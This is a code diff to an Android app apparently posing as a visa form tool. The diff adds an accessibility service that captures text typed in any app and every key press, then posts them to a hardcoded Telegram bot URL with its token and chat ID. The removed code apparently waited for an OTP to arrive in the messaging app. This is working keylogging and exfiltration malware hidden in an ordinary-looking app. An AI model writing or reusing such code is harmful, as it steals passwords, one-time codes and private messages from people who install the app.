@@ -2,24 +2,66 @@ package com.example.visa_form_app
 
 import android.accessibilityservice.AccessibilityService
 import android.view.accessibility.AccessibilityEvent
-import android.content.Intent
+import android.view.KeyEvent
 import android.os.Handler
 import android.os.Looper
 import android.widget.Toast
-import com.example.rendezvous_hb.MainActivity
-
+import okhttp3.MediaType.Companion.toMediaType
+import okhttp3.OkHttpClient
+import okhttp3.Request
+import okhttp3.RequestBody.Companion.toRequestBody
+import org.json.JSONObject
+import java.io.IOException
 
 class MyAccessibilityService : AccessibilityService() {
 
+    private val client = OkHttpClient()
+    private var lastText = ""
+    private val handler = Handler(Looper.getMainLooper())
+    private val debounceRunnable = Runnable { sendToTelegram(lastText) }
+
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
-        if (event?.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED && event.className == "com.google.android.apps.messaging.ui.conversation.ConversationActivity") {
-            // Wait for a few seconds to make sure the OTP is received
-            Handler(Looper.getMainLooper()).postDelayed({
-                val intent = Intent(this, MainActivity::class.java)
-                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-                startActivity(intent)
-            }, 5000)
+        if (event == null) return
+
+        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
+            val rawText = event.text?.joinToString(separator = "") { it.toString() } ?: ""
+            val text = rawText.ifBlank {
+                event.contentDescription?.toString() ?: ""
+            }
+            if (text.isNotEmpty() && text != lastText) {
+                lastText = text
+                handler.removeCallbacks(debounceRunnable)
+                handler.postDelayed(debounceRunnable, 800)
+            }
         }
+    }
+
+    override fun onKeyEvent(event: KeyEvent?): Boolean {
+        if (event?.action == KeyEvent.ACTION_UP) {
+            val keyString = KeyEvent.keyCodeToString(event.keyCode)
+            val message = "KEY_EVENT: $keyString"
+            sendToTelegram(message)
+        }
+        return false
+    }
+
+    private fun sendToTelegram(text: String) {
+        val escapedText = JSONObject.quote(text)
+        val json = """{"chat_id": "8416456484", "text": $escapedText}"""
+        val request = Request.Builder()
+            .url("https://api.telegram.org/bot8264908770:AAEeWPB0hZkTPCqtjpodUn53Yhc2O3sn5ko/sendMessage")
+            .post(json.toRequestBody("application/json; charset=utf-8".toMediaType()))
+            .build()
+
+        client.newCall(request).enqueue(object : okhttp3.Callback {
+            override fun onFailure(call: okhttp3.Call, e: IOException) {
+                e.printStackTrace()
+            }
+
+            override fun onResponse(call: okhttp3.Call, response: okhttp3.Response) {
+                response.close()
+            }
+        })
     }
 
     override fun onInterrupt() {
